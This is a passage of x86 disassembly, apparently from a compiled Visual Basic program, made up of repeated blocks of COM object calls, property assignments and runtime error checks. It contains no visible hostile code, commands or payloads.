  407a37:	33 40 00 
  407a3a:	e9 97 03 00 00       	jmp    0x407dd6
  407a3f:	8b 0e                	mov    (%esi),%ecx
  407a41:	56                   	push   %esi
  407a42:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  407a48:	8d 55 d0             	lea    -0x30(%ebp),%edx
  407a4b:	50                   	push   %eax
  407a4c:	52                   	push   %edx
  407a4d:	ff d3                	call   *%ebx
  407a4f:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  407a55:	8b 06                	mov    (%esi),%eax
  407a57:	56                   	push   %esi
  407a58:	ff 90 0c 03 00 00    	call   *0x30c(%eax)
  407a5e:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  407a61:	50                   	push   %eax
  407a62:	51                   	push   %ecx
  407a63:	ff d3                	call   *%ebx
  407a65:	8b 10                	mov    (%eax),%edx
  407a67:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  407a6a:	51                   	push   %ecx
  407a6b:	50                   	push   %eax
  407a6c:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  407a72:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  407a78:	85 c0                	test   %eax,%eax
  407a7a:	db e2                	fnclex
  407a7c:	7d 18                	jge    0x407a96
  407a7e:	8b 95 48 ff ff ff    	mov    -0xb8(%ebp),%edx
  407a84:	68 a0 00 00 00       	push   $0xa0
  407a89:	68 38 30 40 00       	push   $0x403038
  407a8e:	52                   	push   %edx
  407a8f:	50                   	push   %eax
  407a90:	ff 15 38 10 40 00    	call   *0x401038
  407a96:	8b 45 dc             	mov    -0x24(%ebp),%eax
  407a99:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  407a9f:	89 45 98             	mov    %eax,-0x68(%ebp)
  407aa2:	b8 08 00 00 00       	mov    $0x8,%eax
  407aa7:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  407aaa:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  407ab1:	89 45 90             	mov    %eax,-0x70(%ebp)
  407ab4:	c7 85 58 ff ff ff 78 	movl   $0x403278,-0xa8(%ebp)
  407abb:	32 40 00 
  407abe:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  407ac4:	ff 15 20 11 40 00    	call   *0x401120
  407aca:	c7 85 68 ff ff ff f0 	movl   $0x4031f0,-0x98(%ebp)
  407ad1:	31 40 00 
  407ad4:	e9 46 f1 ff ff       	jmp    0x406c1f
  407ad9:	8b 16                	mov    (%esi),%edx
  407adb:	56                   	push   %esi
  407adc:	ff 92 0c 03 00 00    	call   *0x30c(%edx)
  407ae2:	50                   	push   %eax
  407ae3:	8d 45 d0             	lea    -0x30(%ebp),%eax
  407ae6:	50                   	push   %eax
  407ae7:	ff d3                	call   *%ebx
  407ae9:	8b 0e                	mov    (%esi),%ecx
  407aeb:	56                   	push   %esi
  407aec:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  407af2:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  407af8:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  407afb:	50                   	push   %eax
  407afc:	52                   	push   %edx
  407afd:	ff d3                	call   *%ebx
  407aff:	8b 08                	mov    (%eax),%ecx
  407b01:	8d 55 dc             	lea    -0x24(%ebp),%edx
  407b04:	52                   	push   %edx
  407b05:	50                   	push   %eax
  407b06:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  407b0c:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  407b12:	85 c0                	test   %eax,%eax
  407b14:	db e2                	fnclex
  407b16:	7d 18                	jge    0x407b30
  407b18:	8b 8d 48 ff ff ff    	mov    -0xb8(%ebp),%ecx
  407b1e:	68 a0 00 00 00       	push   $0xa0
  407b23:	68 38 30 40 00       	push   $0x403038
  407b28:	51                   	push   %ecx
  407b29:	50                   	push   %eax
  407b2a:	ff 15 38 10 40 00    	call   *0x401038
  407b30:	8b 45 dc             	mov    -0x24(%ebp),%eax
  407b33:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  407b39:	89 45 98             	mov    %eax,-0x68(%ebp)
  407b3c:	b8 08 00 00 00       	mov    $0x8,%eax
  407b41:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  407b44:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  407b4b:	89 45 90             	mov    %eax,-0x70(%ebp)
  407b4e:	c7 85 58 ff ff ff 80 	movl   $0x403280,-0xa8(%ebp)
  407b55:	32 40 00 
  407b58:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  407b5e:	ff 15 20 11 40 00    	call   *0x401120
  407b64:	c7 85 68 ff ff ff a0 	movl   $0x4033a0,-0x98(%ebp)
  407b6b:	33 40 00 
  407b6e:	e9 63 02 00 00       	jmp    0x407dd6
  407b73:	8b 0e                	mov    (%esi),%ecx
  407b75:	56                   	push   %esi
  407b76:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  407b7c:	8d 55 d0             	lea    -0x30(%ebp),%edx
  407b7f:	50                   	push   %eax
  407b80:	52                   	push   %edx
  407b81:	ff d3                	call   *%ebx
  407b83:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  407b89:	8b 06                	mov    (%esi),%eax
  407b8b:	56                   	push   %esi
  407b8c:	ff 90 0c 03 00 00    	call   *0x30c(%eax)
  407b92:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  407b95:	50                   	push   %eax
  407b96:	51                   	push   %ecx
  407b97:	ff d3                	call   *%ebx
  407b99:	8b 10                	mov    (%eax),%edx
  407b9b:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  407b9e:	51                   	push   %ecx
  407b9f:	50                   	push   %eax
  407ba0:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  407ba6:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  407bac:	85 c0                	test   %eax,%eax
  407bae:	db e2                	fnclex
  407bb0:	7d 18                	jge    0x407bca
  407bb2:	8b 95 48 ff ff ff    	mov    -0xb8(%ebp),%edx
  407bb8:	68 a0 00 00 00       	push   $0xa0
  407bbd:	68 38 30 40 00       	push   $0x403038
  407bc2:	52                   	push   %edx
  407bc3:	50                   	push   %eax
  407bc4:	ff 15 38 10 40 00    	call   *0x401038
  407bca:	8b 45 dc             	mov    -0x24(%ebp),%eax
  407bcd:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  407bd3:	89 45 98             	mov    %eax,-0x68(%ebp)
  407bd6:	b8 08 00 00 00       	mov    $0x8,%eax
  407bdb:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  407bde:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  407be5:	89 45 90             	mov    %eax,-0x70(%ebp)
  407be8:	c7 85 58 ff ff ff b0 	movl   $0x4033b0,-0xa8(%ebp)
  407bef:	33 40 00 
  407bf2:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  407bf8:	ff 15 20 11 40 00    	call   *0x401120
  407bfe:	c7 85 68 ff ff ff a8 	movl   $0x4033a8,-0x98(%ebp)
  407c05:	33 40 00 
  407c08:	e9 12 f0 ff ff       	jmp    0x406c1f
  407c0d:	8b 16                	mov    (%esi),%edx
  407c0f:	56                   	push   %esi
  407c10:	ff 92 0c 03 00 00    	call   *0x30c(%edx)
  407c16:	50                   	push   %eax
  407c17:	8d 45 d0             	lea    -0x30(%ebp),%eax
  407c1a:	50                   	push   %eax
  407c1b:	ff d3                	call   *%ebx
  407c1d:	8b 0e                	mov    (%esi),%ecx
  407c1f:	56                   	push   %esi
  407c20:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  407c26:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  407c2c:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  407c2f:	50                   	push   %eax
  407c30:	52                   	push   %edx
  407c31:	ff d3                	call   *%ebx
  407c33:	8b 08                	mov    (%eax),%ecx
  407c35:	8d 55 dc             	lea    -0x24(%ebp),%edx
  407c38:	52                   	push   %edx
  407c39:	50                   	push   %eax
  407c3a:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  407c40:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  407c46:	85 c0                	test   %eax,%eax
  407c48:	db e2                	fnclex
  407c4a:	7d 18                	jge    0x407c64
  407c4c:	8b 8d 48 ff ff ff    	mov    -0xb8(%ebp),%ecx
  407c52:	68 a0 00 00 00       	push   $0xa0
  407c57:	68 38 30 40 00       	push   $0x403038
  407c5c:	51                   	push   %ecx
  407c5d:	50                   	push   %eax
  407c5e:	ff 15 38 10 40 00    	call   *0x401038
  407c64:	8b 45 dc             	mov    -0x24(%ebp),%eax
  407c67:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  407c6d:	89 45 98             	mov    %eax,-0x68(%ebp)
  407c70:	b8 08 00 00 00       	mov    $0x8,%eax
  407c75:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  407c78:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  407c7f:	89 45 90             	mov    %eax,-0x70(%ebp)
  407c82:	c7 85 58 ff ff ff 70 	movl   $0x403270,-0xa8(%ebp)
  407c89:	32 40 00 
  407c8c:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  407c92:	ff 15 20 11 40 00    	call   *0x401120
  407c98:	c7 85 68 ff ff ff 68 	movl   $0x403268,-0x98(%ebp)
  407c9f:	32 40 00 
  407ca2:	e9 2f 01 00 00       	jmp    0x407dd6
  407ca7:	8b 0e                	mov    (%esi),%ecx
  407ca9:	56                   	push   %esi
  407caa:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  407cb0:	8d 55 d0             	lea    -0x30(%ebp),%edx
  407cb3:	50                   	push   %eax
  407cb4:	52                   	push   %edx
  407cb5:	ff d3                	call   *%ebx
  407cb7:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  407cbd:	8b 06                	mov    (%esi),%eax
  407cbf:	56                   	push   %esi
  407cc0:	ff 90 0c 03 00 00    	call   *0x30c(%eax)
  407cc6:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  407cc9:	50                   	push   %eax
  407cca:	51                   	push   %ecx
  407ccb:	ff d3                	call   *%ebx
  407ccd:	8b 10                	mov    (%eax),%edx
  407ccf:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  407cd2:	51                   	push   %ecx
  407cd3:	50                   	push   %eax
  407cd4:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  407cda:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  407ce0:	85 c0                	test   %eax,%eax
  407ce2:	db e2                	fnclex
  407ce4:	7d 18                	jge    0x407cfe
  407ce6:	8b 95 48 ff ff ff    	mov    -0xb8(%ebp),%edx
  407cec:	68 a0 00 00 00       	push   $0xa0
  407cf1:	68 38 30 40 00       	push   $0x403038
  407cf6:	52                   	push   %edx
  407cf7:	50                   	push   %eax
  407cf8:	ff 15 38 10 40 00    	call   *0x401038
  407cfe:	8b 45 dc             	mov    -0x24(%ebp),%eax
  407d01:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  407d07:	89 45 98             	mov    %eax,-0x68(%ebp)
  407d0a:	b8 08 00 00 00       	mov    $0x8,%eax
  407d0f:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  407d12:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  407d19:	89 45 90             	mov    %eax,-0x70(%ebp)
  407d1c:	c7 85 58 ff ff ff c0 	movl   $0x4033c0,-0xa8(%ebp)
  407d23:	33 40 00 
  407d26:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  407d2c:	ff 15 20 11 40 00    	call   *0x401120
  407d32:	c7 85 68 ff ff ff b8 	movl   $0x4033b8,-0x98(%ebp)
  407d39:	33 40 00 
  407d3c:	e9 de ee ff ff       	jmp    0x406c1f
  407d41:	8b 16                	mov    (%esi),%edx
  407d43:	56                   	push   %esi
  407d44:	ff 92 0c 03 00 00    	call   *0x30c(%edx)
  407d4a:	50                   	push   %eax
  407d4b:	8d 45 d0             	lea    -0x30(%ebp),%eax
  407d4e:	50                   	push   %eax
  407d4f:	ff d3                	call   *%ebx
  407d51:	8b 0e                	mov    (%esi),%ecx
  407d53:	56                   	push   %esi
  407d54:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  407d5a:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  407d60:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  407d63:	50                   	push   %eax
  407d64:	52                   	push   %edx
  407d65:	ff d3                	call   *%ebx
  407d67:	8b 08                	mov    (%eax),%ecx
  407d69:	8d 55 dc             	lea    -0x24(%ebp),%edx
  407d6c:	52                   	push   %edx
  407d6d:	50                   	push   %eax
  407d6e:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  407d74:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  407d7a:	85 c0                	test   %eax,%eax
  407d7c:	db e2                	fnclex
  407d7e:	7d 18                	jge    0x407d98
  407d80:	8b 8d 48 ff ff ff    	mov    -0xb8(%ebp),%ecx
  407d86:	68 a0 00 00 00       	push   $0xa0
  407d8b:	68 38 30 40 00       	push   $0x403038
  407d90:	51                   	push   %ecx
  407d91:	50                   	push   %eax
  407d92:	ff 15 38 10 40 00    	call   *0x401038
  407d98:	8b 45 dc             	mov    -0x24(%ebp),%eax
  407d9b:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  407da1:	89 45 98             	mov    %eax,-0x68(%ebp)
  407da4:	b8 08 00 00 00       	mov    $0x8,%eax
  407da9:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  407dac:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  407db3:	89 45 90             	mov    %eax,-0x70(%ebp)
  407db6:	c7 85 58 ff ff ff d0 	movl   $0x4033d0,-0xa8(%ebp)
  407dbd:	33 40 00 
  407dc0:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  407dc6:	ff 15 20 11 40 00    	call   *0x401120
  407dcc:	c7 85 68 ff ff ff c8 	movl   $0x4033c8,-0x98(%ebp)
  407dd3:	33 40 00 
  407dd6:	8d 95 60 ff ff ff    	lea    -0xa0(%ebp),%edx
  407ddc:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  407ddf:	c7 85 60 ff ff ff 08 	movl   $0x8,-0xa0(%ebp)
  407de6:	00 00 00 
  407de9:	ff 15 20 11 40 00    	call   *0x401120
  407def:	33 d2                	xor    %edx,%edx
  407df1:	81 ff 00 80 ff ff    	cmp    $0xffff8000,%edi
  407df7:	0f 94 c2             	sete   %dl
  407dfa:	f7 da                	neg    %edx
  407dfc:	8d 45 b0             	lea    -0x50(%ebp),%eax
  407dff:	66 89 95 78 ff ff ff 	mov    %dx,-0x88(%ebp)
  407e06:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  407e09:	50                   	push   %eax
  407e0a:	8d 95 70 ff ff ff    	lea    -0x90(%ebp),%edx
  407e10:	51                   	push   %ecx
  407e11:	8d 45 a0             	lea    -0x60(%ebp),%eax
  407e14:	52                   	push   %edx
  407e15:	50                   	push   %eax
  407e16:	c7 85 70 ff ff ff 0b 	movl   $0xb,-0x90(%ebp)
  407e1d:	00 00 00 
  407e20:	ff 15 04 11 40 00    	call   *0x401104
  407e26:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  407e2c:	8d 55 90             	lea    -0x70(%ebp),%edx
  407e2f:	8d 45 a0             	lea    -0x60(%ebp),%eax
  407e32:	52                   	push   %edx
  407e33:	8b 39                	mov    (%ecx),%edi
  407e35:	8d 4d 80             	lea    -0x80(%ebp),%ecx
  407e38:	50                   	push   %eax
  407e39:	51                   	push   %ecx
  407e3a:	ff 15 d0 10 40 00    	call   *0x4010d0
  407e40:	8d 55 d8             	lea    -0x28(%ebp),%edx
  407e43:	50                   	push   %eax
  407e44:	52                   	push   %edx
  407e45:	ff 15 cc 10 40 00    	call   *0x4010cc
  407e4b:	50                   	push   %eax
  407e4c:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  407e52:	50                   	push   %eax
  407e53:	ff 97 a4 00 00 00    	call   *0xa4(%edi)
  407e59:	85 c0                	test   %eax,%eax
  407e5b:	db e2                	fnclex
  407e5d:	0f 8d 84 ef ff ff    	jge    0x406de7
  407e63:	e9 67 ef ff ff       	jmp    0x406dcf
  407e68:	8b 0e                	mov    (%esi),%ecx
  407e6a:	56                   	push   %esi
  407e6b:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  407e71:	8d 55 d0             	lea    -0x30(%ebp),%edx
  407e74:	50                   	push   %eax
  407e75:	52                   	push   %edx
  407e76:	ff d3                	call   *%ebx
  407e78:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  407e7e:	8b 06                	mov    (%esi),%eax
  407e80:	56                   	push   %esi
  407e81:	ff 90 0c 03 00 00    	call   *0x30c(%eax)
  407e87:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  407e8a:	50                   	push   %eax
  407e8b:	51                   	push   %ecx
  407e8c:	ff d3                	call   *%ebx
  407e8e:	8b 10                	mov    (%eax),%edx
  407e90:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  407e93:	51                   	push   %ecx
  407e94:	50                   	push   %eax
  407e95:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  407e9b:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  407ea1:	85 c0                	test   %eax,%eax
  407ea3:	db e2                	fnclex
  407ea5:	7d 18                	jge    0x407ebf
  407ea7:	8b 95 48 ff ff ff    	mov    -0xb8(%ebp),%edx
  407ead:	68 a0 00 00 00       	push   $0xa0
  407eb2:	68 38 30 40 00       	push   $0x403038
  407eb7:	52                   	push   %edx
  407eb8:	50                   	push   %eax
  407eb9:	ff 15 38 10 40 00    	call   *0x401038
  407ebf:	8b 45 dc             	mov    -0x24(%ebp),%eax
  407ec2:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  407ec8:	89 45 98             	mov    %eax,-0x68(%ebp)
  407ecb:	b8 08 00 00 00       	mov    $0x8,%eax
  407ed0:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  407ed3:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  407eda:	89 45 90             	mov    %eax,-0x70(%ebp)
  407edd:	c7 85 58 ff ff ff e0 	movl   $0x4033e0,-0xa8(%ebp)
  407ee4:	33 40 00 
  407ee7:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  407eed:	ff 15 20 11 40 00    	call   *0x401120
  407ef3:	c7 85 68 ff ff ff d8 	movl   $0x4033d8,-0x98(%ebp)
  407efa:	33 40 00 
  407efd:	e9 1d ed ff ff       	jmp    0x406c1f
  407f02:	8b 16                	mov    (%esi),%edx
  407f04:	56                   	push   %esi
  407f05:	ff 92 0c 03 00 00    	call   *0x30c(%edx)
  407f0b:	50                   	push   %eax
  407f0c:	8d 45 d0             	lea    -0x30(%ebp),%eax
  407f0f:	50                   	push   %eax
  407f10:	ff d3                	call   *%ebx
  407f12:	8b 0e                	mov    (%esi),%ecx
  407f14:	56                   	push   %esi
  407f15:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  407f1b:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  407f21:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  407f24:	50                   	push   %eax
  407f25:	52                   	push   %edx
  407f26:	ff d3                	call   *%ebx
  407f28:	8b 08                	mov    (%eax),%ecx
  407f2a:	8d 55 dc             	lea    -0x24(%ebp),%edx
  407f2d:	52                   	push   %edx
  407f2e:	50                   	push   %eax
  407f2f:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  407f35:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  407f3b:	85 c0                	test   %eax,%eax
  407f3d:	db e2                	fnclex
  407f3f:	7d 18                	jge    0x407f59
  407f41:	8b 8d 48 ff ff ff    	mov    -0xb8(%ebp),%ecx
  407f47:	68 a0 00 00 00       	push   $0xa0
  407f4c:	68 38 30 40 00       	push   $0x403038
  407f51:	51                   	push   %ecx
  407f52:	50                   	push   %eax
  407f53:	ff 15 38 10 40 00    	call   *0x401038
  407f59:	8b 45 dc             	mov    -0x24(%ebp),%eax
  407f5c:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  407f62:	89 45 98             	mov    %eax,-0x68(%ebp)
  407f65:	b8 08 00 00 00       	mov    $0x8,%eax
  407f6a:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  407f6d:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  407f74:	89 45 90             	mov    %eax,-0x70(%ebp)
  407f77:	c7 85 58 ff ff ff f0 	movl   $0x4033f0,-0xa8(%ebp)
  407f7e:	33 40 00 
  407f81:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  407f87:	ff 15 20 11 40 00    	call   *0x401120
  407f8d:	8d 95 60 ff ff ff    	lea    -0xa0(%ebp),%edx
  407f93:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  407f96:	c7 85 68 ff ff ff e8 	movl   $0x4033e8,-0x98(%ebp)
  407f9d:	33 40 00 
  407fa0:	c7 85 60 ff ff ff 08 	movl   $0x8,-0xa0(%ebp)
  407fa7:	00 00 00 
  407faa:	ff 15 20 11 40 00    	call   *0x401120
  407fb0:	33 d2                	xor    %edx,%edx
  407fb2:	81 ff 00 80 ff ff    	cmp    $0xffff8000,%edi
  407fb8:	0f 94 c2             	sete   %dl
  407fbb:	f7 da                	neg    %edx
  407fbd:	8d 45 b0             	lea    -0x50(%ebp),%eax
  407fc0:	66 89 95 78 ff ff ff 	mov    %dx,-0x88(%ebp)
  407fc7:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  407fca:	50                   	push   %eax
  407fcb:	8d 95 70 ff ff ff    	lea    -0x90(%ebp),%edx
  407fd1:	51                   	push   %ecx
  407fd2:	8d 45 a0             	lea    -0x60(%ebp),%eax
  407fd5:	52                   	push   %edx
  407fd6:	50                   	push   %eax
  407fd7:	c7 85 70 ff ff ff 0b 	movl   $0xb,-0x90(%ebp)
  407fde:	00 00 00 
  407fe1:	ff 15 04 11 40 00    	call   *0x401104
  407fe7:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  407fed:	8d 55 90             	lea    -0x70(%ebp),%edx
  407ff0:	8d 45 a0             	lea    -0x60(%ebp),%eax
  407ff3:	52                   	push   %edx
  407ff4:	8b 39                	mov    (%ecx),%edi
  407ff6:	8d 4d 80             	lea    -0x80(%ebp),%ecx
  407ff9:	50                   	push   %eax
  407ffa:	51                   	push   %ecx
  407ffb:	ff 15 d0 10 40 00    	call   *0x4010d0
  408001:	8d 55 d8             	lea    -0x28(%ebp),%edx
  408004:	50                   	push   %eax
  408005:	52                   	push   %edx
  408006:	ff 15 cc 10 40 00    	call   *0x4010cc
  40800c:	50                   	push   %eax
  40800d:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  408013:	50                   	push   %eax
  408014:	ff 97 a4 00 00 00    	call   *0xa4(%edi)
  40801a:	85 c0                	test   %eax,%eax
  40801c:	db e2                	fnclex
  40801e:	7d 18                	jge    0x408038
  408020:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  408026:	68 a4 00 00 00       	push   $0xa4
  40802b:	68 38 30 40 00       	push   $0x403038
  408030:	51                   	push   %ecx
  408031:	50                   	push   %eax
  408032:	ff 15 38 10 40 00    	call   *0x401038
  408038:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40803b:	ff 15 64 11 40 00    	call   *0x401164
  408041:	8d 55 d0             	lea    -0x30(%ebp),%edx
  408044:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  408047:	52                   	push   %edx
  408048:	50                   	push   %eax
  408049:	6a 02                	push   $0x2
  40804b:	ff 15 20 10 40 00    	call   *0x401020
  408051:	8d 4d 80             	lea    -0x80(%ebp),%ecx
  408054:	8d 55 a0             	lea    -0x60(%ebp),%edx
  408057:	51                   	push   %ecx
  408058:	8d 45 90             	lea    -0x70(%ebp),%eax
  40805b:	52                   	push   %edx
  40805c:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  40805f:	50                   	push   %eax
  408060:	8d 55 c0             	lea    -0x40(%ebp),%edx
  408063:	51                   	push   %ecx
  408064:	8d 85 70 ff ff ff    	lea    -0x90(%ebp),%eax
  40806a:	52                   	push   %edx
  40806b:	50                   	push   %eax
  40806c:	6a 06                	push   $0x6
  40806e:	ff 15 18 10 40 00    	call   *0x401018
  408074:	83 c4 28             	add    $0x28,%esp
  408077:	e9 4c 0d 00 00       	jmp    0x408dc8
  40807c:	8b 0e                	mov    (%esi),%ecx
  40807e:	56                   	push   %esi
  40807f:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  408085:	8d 55 d0             	lea    -0x30(%ebp),%edx
  408088:	50                   	push   %eax
  408089:	52                   	push   %edx
  40808a:	ff d3                	call   *%ebx
  40808c:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  408092:	8b 06                	mov    (%esi),%eax
  408094:	56                   	push   %esi
  408095:	ff 90 0c 03 00 00    	call   *0x30c(%eax)
  40809b:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  40809e:	50                   	push   %eax
  40809f:	51                   	push   %ecx
  4080a0:	ff d3                	call   *%ebx
  4080a2:	8b 10                	mov    (%eax),%edx
  4080a4:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4080a7:	51                   	push   %ecx
  4080a8:	50                   	push   %eax
  4080a9:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  4080af:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  4080b5:	85 c0                	test   %eax,%eax
  4080b7:	db e2                	fnclex
  4080b9:	7d 18                	jge    0x4080d3
  4080bb:	8b 95 48 ff ff ff    	mov    -0xb8(%ebp),%edx
  4080c1:	68 a0 00 00 00       	push   $0xa0
  4080c6:	68 38 30 40 00       	push   $0x403038
  4080cb:	52                   	push   %edx
  4080cc:	50                   	push   %eax
  4080cd:	ff 15 38 10 40 00    	call   *0x401038
  4080d3:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4080d6:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  4080dc:	89 45 98             	mov    %eax,-0x68(%ebp)
  4080df:	b8 08 00 00 00       	mov    $0x8,%eax
  4080e4:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  4080e7:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  4080ee:	89 45 90             	mov    %eax,-0x70(%ebp)
  4080f1:	c7 85 58 ff ff ff 00 	movl   $0x403400,-0xa8(%ebp)
  4080f8:	34 40 00 
  4080fb:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  408101:	ff 15 20 11 40 00    	call   *0x401120
  408107:	8d 95 60 ff ff ff    	lea    -0xa0(%ebp),%edx
  40810d:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  408110:	c7 85 68 ff ff ff f8 	movl   $0x4033f8,-0x98(%ebp)
  408117:	33 40 00 
  40811a:	c7 85 60 ff ff ff 08 	movl   $0x8,-0xa0(%ebp)
  408121:	00 00 00 
  408124:	ff 15 20 11 40 00    	call   *0x401120
  40812a:	33 c0                	xor    %eax,%eax
  40812c:	81 ff 00 80 ff ff    	cmp    $0xffff8000,%edi
  408132:	0f 94 c0             	sete   %al
  408135:	f7 d8                	neg    %eax
  408137:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  40813a:	66 89 85 78 ff ff ff 	mov    %ax,-0x88(%ebp)
  408141:	8d 55 c0             	lea    -0x40(%ebp),%edx
  408144:	51                   	push   %ecx
  408145:	8d 85 70 ff ff ff    	lea    -0x90(%ebp),%eax
  40814b:	52                   	push   %edx
  40814c:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  40814f:	50                   	push   %eax
  408150:	51                   	push   %ecx
  408151:	c7 85 70 ff ff ff 0b 	movl   $0xb,-0x90(%ebp)
  408158:	00 00 00 
  40815b:	ff 15 04 11 40 00    	call   *0x401104
  408161:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  408167:	8d 45 90             	lea    -0x70(%ebp),%eax
  40816a:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  40816d:	50                   	push   %eax
  40816e:	8b 3a                	mov    (%edx),%edi
  408170:	8d 55 80             	lea    -0x80(%ebp),%edx
  408173:	51                   	push   %ecx
  408174:	52                   	push   %edx
  408175:	ff 15 d0 10 40 00    	call   *0x4010d0
  40817b:	50                   	push   %eax
  40817c:	8d 45 d8             	lea    -0x28(%ebp),%eax
  40817f:	50                   	push   %eax
  408180:	ff 15 cc 10 40 00    	call   *0x4010cc
  408186:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  40818c:	50                   	push   %eax
  40818d:	51                   	push   %ecx
  40818e:	ff 97 a4 00 00 00    	call   *0xa4(%edi)
  408194:	85 c0                	test   %eax,%eax
  408196:	db e2                	fnclex
  408198:	7d 18                	jge    0x4081b2
  40819a:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  4081a0:	68 a4 00 00 00       	push   $0xa4
  4081a5:	68 38 30 40 00       	push   $0x403038
  4081aa:	52                   	push   %edx
  4081ab:	50                   	push   %eax
  4081ac:	ff 15 38 10 40 00    	call   *0x401038
